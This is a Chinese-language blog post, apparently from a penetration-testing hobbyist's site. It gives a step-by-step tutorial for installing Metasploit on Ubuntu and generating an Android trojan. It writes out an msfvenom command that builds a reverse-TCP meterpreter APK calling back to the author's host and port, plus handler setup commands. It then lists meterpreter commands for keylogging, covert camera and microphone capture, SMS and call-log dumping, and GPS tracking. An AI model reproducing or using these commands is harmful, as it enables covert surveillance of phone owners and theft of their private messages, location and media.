@@ -1,0 +1,190 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Ubuntu下配置msf并生成安卓木马 | 0000FF's Blog</title><meta name="author" content="0000FF"><meta name="copyright" content="0000FF"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="linux通用方法：1curl https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;rapid7&#x2F;metasploit-omnibus&#x2F;master&#x2F;config&#x2F;templates&#x2F;metasploit-framework-wrappers&#x2F;msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp;am">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ubuntu下配置msf并生成安卓木马">
+<meta property="og:url" content="https://chr1sto4f.github.io/2022/02/11/Ubuntu%E4%B8%8B%E9%85%8D%E7%BD%AEmsf%E5%B9%B6%E7%94%9F%E6%88%90%E5%AE%89%E5%8D%93%E6%9C%A8%E9%A9%AC/index.html">
+<meta property="og:site_name" content="0000FF&#39;s Blog">
+<meta property="og:description" content="linux通用方法：1curl https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;rapid7&#x2F;metasploit-omnibus&#x2F;master&#x2F;config&#x2F;templates&#x2F;metasploit-framework-wrappers&#x2F;msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp;am">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/R-C.a4385dd85202d7ff20f912bb5c675214.jpg">
+<meta property="article:published_time" content="2022-02-10T23:59:16.000Z">
+<meta property="article:modified_time" content="2023-02-13T07:24:36.814Z">
+<meta property="article:author" content="0000FF">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/R-C.a4385dd85202d7ff20f912bb5c675214.jpg"><link rel="shortcut icon" href="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/0000ff.jpg"><link rel="canonical" href="https://chr1sto4f.github.io/2022/02/11/Ubuntu%E4%B8%8B%E9%85%8D%E7%BD%AEmsf%E5%B9%B6%E7%94%9F%E6%88%90%E5%AE%89%E5%8D%93%E6%9C%A8%E9%A9%AC/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Ubuntu下配置msf并生成安卓木马',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-02-13 15:24:36'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/0000ff.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/R-C.a4385dd85202d7ff20f912bb5c675214.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">0000FF's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Ubuntu下配置msf并生成安卓木马</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-02-10T23:59:16.000Z" title="发表于 2022-02-11 07:59:16">2022-02-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-02-13T07:24:36.814Z" title="更新于 2023-02-13 15:24:36">2023-02-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Ubuntu下配置msf并生成安卓木马"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="linux通用方法："><a href="#linux通用方法：" class="headerlink" title="linux通用方法："></a>linux通用方法：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; <span class="built_in">chmod</span> 755 msfinstall &amp;&amp; ./msfinstall</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole 							<span class="comment">#进入msf</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="ubuntu可以用snap包管理"><a href="#ubuntu可以用snap包管理" class="headerlink" title="ubuntu可以用snap包管理"></a>ubuntu可以用snap包管理</h3><p>通过Snap可以安装众多的软件包。需要注意的是，snap是一种全新的软件包管理方式，它类似一个容器拥有一个应用程序所有的文件和库，各个应用程序之间完全独立。所以使用snap包的好处就是它解决了应用程序之间的依赖问题，使应用程序之间更容易管理。但是由此带来的问题就是它占用更多的磁盘空间.安装路径统一在&#x2F;snap<br>介绍一些常用命令，有点类似docker</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">snap list 							<span class="comment"># 可以查看，默认带的组件是core、lxd、snapd</span></span><br><span class="line">snap search XX 					<span class="comment"># 搜索想要的snap包</span></span><br><span class="line">snap install XX 				<span class="comment"># 安装snap包</span></span><br><span class="line">snap remove tomcat			<span class="comment"># 删除一个snap包</span></span><br><span class="line">卸载snap sudo apt autoremove --purge snapd</span><br></pre></td></tr></table></figure>
+
+<p>这里可以用snap来下载msf</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snap install metasploit-framework</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/image-20230211081441670.png" alt="image-20230211081441670"></p>
+<p>本次主要实现的是安卓木马（没免杀也没什么其他，单纯用一下模块）</p>
+<p>命令： </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=&lt;本地ip&gt; LPORT=&lt;本地端口号&gt; R &gt; &lt;文件名&gt;.apk</span><br></pre></td></tr></table></figure>
+
+<p>实例：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.32.1 LPORT=5555 R &gt;Android.apk</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/image-20230211081402752.png" alt="image-20230211081402752">生成之后在目标🐔中安装apk</p>
+<p>在msf中开始监听</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler（选择模块）</span><br><span class="line"><span class="built_in">set</span> payload android/meterpreter/reverse_tcp（选择攻击模块）</span><br><span class="line"><span class="built_in">set</span> LhOST 192.168.32.1（填写自己主机的IP地址）</span><br><span class="line"><span class="built_in">set</span> lport 5555（填写刚才生成文件时的端口号）</span><br><span class="line">show options（查看设置参数）</span><br><span class="line">exploit -z -j（后台执行，也可以直接输入命令exploit开始攻击,只要靶机安装了后门软件用什么方法都可以，直接run开始执行攻击也行）</span><br></pre></td></tr></table></figure>
+
+<p>现在等待靶机打开APP就可以了</p>
+<p>注：如果安卓无法访问通你的vps那么大概率就会这样连不上</p>
+<p><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/Snipaste_2023-02-11_08-12-45.png" alt="Snipaste_2023-02-11_08-12-45"></p>
+<p>如果成功运行了之后就会出现三个蓝色星号，然后会出现meterpreter，强大的shell</p>
+<p><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/image-20230211081600322.png" alt="image-20230211081600322"></p>
+<p>安卓常用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sysinfo #查看对方手机系统信息</span><br><span class="line">app_list #查看对方手机安装哪些app文件</span><br><span class="line">webcam_snap #远程控制对方手机拍摄一张照片</span><br><span class="line">webcam_chat #远程控制对方手机开起视频聊天</span><br><span class="line">dump_sms #实时查看对方手机的信息</span><br><span class="line">dump_calllog #获取对方手机的通讯录</span><br><span class="line">geolocate #实时获取对方手机GPS定位</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/image-20230211081706863.png" alt="image-20230211081706863"></p>
+<p><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/image-20230211081926628.png" alt="image-20230211081926628"></p>
+<p><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/image-20230211081939339.png" alt="image-20230211081939339"></p>
+<p><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/image-20230211081745276.png" alt="image-20230211081745276"></p>
+<h3 id="其他命令："><a href="#其他命令：" class="headerlink" title="其他命令："></a>其他命令：</h3><p>cmd</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">cmd指令:</span><br><span class="line"><span class="built_in">cat</span> 读取文件内容到屏幕</span><br><span class="line"><span class="built_in">cd</span> 更改目录</span><br><span class="line">checksum 检索文件的校验和</span><br><span class="line"><span class="built_in">cp</span> 将源复制到目标</span><br><span class="line">del 删除指定文件</span><br><span class="line"><span class="built_in">dir</span> 列出文件（<span class="built_in">ls</span> 的别名）</span><br><span class="line">下载 下载文件或目录</span><br><span class="line">编辑 编辑文件</span><br><span class="line">getlwd 打印本地工作目录</span><br><span class="line">getwd 打印工作目录</span><br><span class="line">lcd 更改本地工作目录</span><br><span class="line">lls 列出本地文件</span><br><span class="line">lpwd 打印本地工作目录</span><br><span class="line"><span class="built_in">ls</span> 列出文件</span><br><span class="line"><span class="built_in">mkdir</span> 创建目录</span><br><span class="line"><span class="built_in">mv</span> 将源移动到目标</span><br><span class="line"><span class="built_in">pwd</span> 打印工作目录</span><br><span class="line"><span class="built_in">rm</span> 删除指定文件</span><br><span class="line"><span class="built_in">rmdir</span> 删除目录</span><br><span class="line">search 搜索文件</span><br><span class="line">show_mount 列出所有挂载点/逻辑驱动器</span><br><span class="line">upload 上传文件或目录</span><br><span class="line">pkill 按名称终止进程</span><br></pre></td></tr></table></figure>
+
+<p>meterpreter</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">meterpreter命令：</span><br><span class="line">keyscan_start 开始捕获击键（开始键盘记录）</span><br><span class="line">keyscan_dump 转储按键缓冲（下载键盘记录）</span><br><span class="line">keyscan_stop 停止捕获击键（停止键盘记录）</span><br><span class="line">record_mic X秒从默认的麦克风record_mic音频记录（音频录制）</span><br><span class="line">webcam_chat 开始视频聊天（视频，对方会有弹窗）</span><br><span class="line">webcam_list 单摄像头（查看摄像头列表）</span><br><span class="line">webcam_snap 采取快照从指定的摄像头（摄像头拍摄一张照片）</span><br><span class="line">webcam_stream 播放视频流从指定的摄像头（开启摄像头监控）</span><br><span class="line">enumdesktops 列出所有可访问的桌面和窗口站（窗体列表）</span><br><span class="line">getdesktop 得到当前的Meterpreter桌面</span><br><span class="line">reboot 重新启动远程计算机</span><br><span class="line">shutdown 关闭远程计算机</span><br><span class="line">shell 放入系统命令 shell</span><br><span class="line">enumdesktops 列出所有可访问的桌面和窗口站</span><br><span class="line">getdesktop 获取当前的meterpreter桌面</span><br><span class="line">idletime 返回远程用户空闲的秒数</span><br><span class="line">keyboard_send 发送击键</span><br><span class="line">keyevent 发送按键事件</span><br><span class="line">keyscan_dump 转储击键缓冲区</span><br><span class="line">keyscan_start 开始捕获击键</span><br><span class="line">keyscan_stop 停止捕获击键</span><br><span class="line">mouse 发送鼠标事件</span><br><span class="line">screenshare 实时观看远程用户桌面</span><br><span class="line">screenshot 抓取交互式桌面的屏幕截图</span><br><span class="line">setdesktop 更改 Meterpreters 当前桌面</span><br><span class="line">uictl 控制一些用户界面组件</span><br><span class="line">record_mic 从默认麦克风录制音频 X 秒</span><br><span class="line">webcam_chat 开始视频聊天</span><br><span class="line">webcam_list 列出网络摄像头</span><br><span class="line">webcam_snap 从指定的网络摄像头拍摄快照</span><br><span class="line">webcam_stream 播放来自指定网络摄像头的视频流</span><br><span class="line">play 在目标系统上播放波形音频文件 (.wav)</span><br><span class="line">getsystem 尝试将您的权限提升到本地系统的权限</span><br><span class="line">execute -f notepad 打开记事本</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><p>还有一些烂尾的事情：获取shell之后没再获得更稳定的shell,很多指令都需要用户授权（不知道怎么直接绕）,关于apk的伪装，免杀等等处理细节都还没做。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://chr1sto4f.github.io">0000FF</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://chr1sto4f.github.io/2022/02/11/Ubuntu%E4%B8%8B%E9%85%8D%E7%BD%AEmsf%E5%B9%B6%E7%94%9F%E6%88%90%E5%AE%89%E5%8D%93%E6%9C%A8%E9%A9%AC/">https://chr1sto4f.github.io/2022/02/11/Ubuntu%E4%B8%8B%E9%85%8D%E7%BD%AEmsf%E5%B9%B6%E7%94%9F%E6%88%90%E5%AE%89%E5%8D%93%E6%9C%A8%E9%A9%AC/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://chr1sto4f.github.io" target="_blank">0000FF's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></div><div class="post_share"><div class="social-share" data-image="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/R-C.a4385dd85202d7ff20f912bb5c675214.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/02/18/%E5%B8%B8%E8%A7%81%E9%9D%B6%E5%9C%BA%E5%90%88%E9%9B%86/"><img class="prev-cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">常见靶场合集</div></div></a></div><div class="next-post pull-right"><a href="/2022/02/01/Web%E7%8B%97%E7%9A%84%E8%A6%81%E6%87%82%E7%9A%84Linux%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><img class="next-cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/9e759a9e6d036079ae79df3d8c914976.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Web狗的要懂的Linux基础知识</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/02/04/DerpNStink-1/" title="DerpNStink-1"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-04</div><div class="title">DerpNStink-1</div></div></a></div><div><a href="/2023/01/26/Lampiao/" title="Lampiao"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/c8f5624d123daea9.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-26</div><div class="title">Lampiao</div></div></a></div><div><a href="/2023/01/26/GoldenEye/" title="GoldenEye"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/R-C.ebb9668b3a30bc070e108ec0341097bd.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-26</div><div class="title">GoldenEye</div></div></a></div><div><a href="/2023/01/26/Raven-2/" title="Raven-2"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/20220430025304_38833.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-26</div><div class="title">Raven-2</div></div></a></div><div><a href="/2021/02/05/SQLi%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E5%B8%B8%E7%94%A8%E5%A4%87%E5%BF%98%E5%8D%95/" title="SQLi认证绕过常用备忘单"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/R-C.a75b2c4dc8eacda7664ec01cb5da76fd.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-05</div><div class="title">SQLi认证绕过常用备忘单</div></div></a></div><div><a href="/2023/01/26/Tr0ll-1/" title="Tr0ll-1"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/1627789557_462143.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-26</div><div class="title">Tr0ll-1</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/0000ff.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">0000FF</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Chr1sTo4F"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Chr1sTo4F" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:Chr1sTo4F@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">考研一战成硕</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/02/12/hvv%E9%9D%A2%E7%BB%8F/" title="hvv面经"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/8080d89c2ceb3204.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hvv面经"/></a><div class="content"><a class="title" href="/2023/02/12/hvv%E9%9D%A2%E7%BB%8F/" title="hvv面经">hvv面经</a><time datetime="2023-02-12T06:37:08.000Z" title="发表于 2023-02-12 14:37:08">2023-02-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/04/DerpNStink-1/" title="DerpNStink-1"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DerpNStink-1"/></a><div class="content"><a class="title" href="/2023/02/04/DerpNStink-1/" title="DerpNStink-1">DerpNStink-1</a><time datetime="2023-02-04T06:47:32.000Z" title="发表于 2023-02-04 14:47:32">2023-02-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/30/Windows%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86and%E5%9F%9F%E6%B8%97%E9%80%8F%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/" title="Windows提权漏洞合集and域渗透历史漏洞整理"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/R-C.ebb9668b3a30bc070e108ec0341097bd.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows提权漏洞合集and域渗透历史漏洞整理"/></a><div class="content"><a class="title" href="/2023/01/30/Windows%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86and%E5%9F%9F%E6%B8%97%E9%80%8F%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/" title="Windows提权漏洞合集and域渗透历史漏洞整理">Windows提权漏洞合集and域渗透历史漏洞整理</a><time datetime="2023-01-30T04:27:55.000Z" title="发表于 2023-01-30 12:27:55">2023-01-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/27/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="微信小程序信息收集"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/t01db9bc29a66401694.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="微信小程序信息收集"/></a><div class="content"><a class="title" href="/2023/01/27/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="微信小程序信息收集">微信小程序信息收集</a><time datetime="2023-01-27T06:06:28.000Z" title="发表于 2023-01-27 14:06:28">2023-01-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/26/Lord-Of-The-Root-1-0-1/" title="Lord Of The Root-1.0.1"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/9e759a9e6d036079ae79df3d8c914976.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Lord Of The Root-1.0.1"/></a><div class="content"><a class="title" 